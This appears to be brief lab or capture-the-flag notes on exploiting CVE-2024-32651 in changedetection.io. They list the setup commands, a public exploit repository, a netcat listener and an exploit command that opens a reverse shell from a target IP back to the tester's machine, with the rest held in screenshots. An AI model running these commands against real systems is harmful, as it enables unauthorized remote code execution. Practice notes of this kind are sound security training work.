![](Screenshot%202026-06-30%20at%2014.34.57.png)

![](Screenshot%202026-06-30%20at%2014.35.09.png)

https://nvd.nist.gov/vuln/detail/CVE-2024-32651  
https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE

`python -m venv .venv`  
`source .venv/bin/activate`  
`pip install requests beautifulsoup4`  
`git clone https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE.git`

![](Screenshot%202026-06-30%20at%2014.59.49.png)

There is a full stop that needs to be removed.

![](Screenshot%202026-06-30%20at%2014.59.07.png)

![](Screenshot%202026-06-30%20at%2014.58.42.png)

Start a listener:  
`rlwrap nc -lvnp 1234`

Exploit:
`python3 CVE-2024-32651.py --url: http://192.168.168.97:5000 --port: 1234 --ip: 192.168.45.179`

![](Screenshot%202026-06-30%20at%2015.02.48.png)

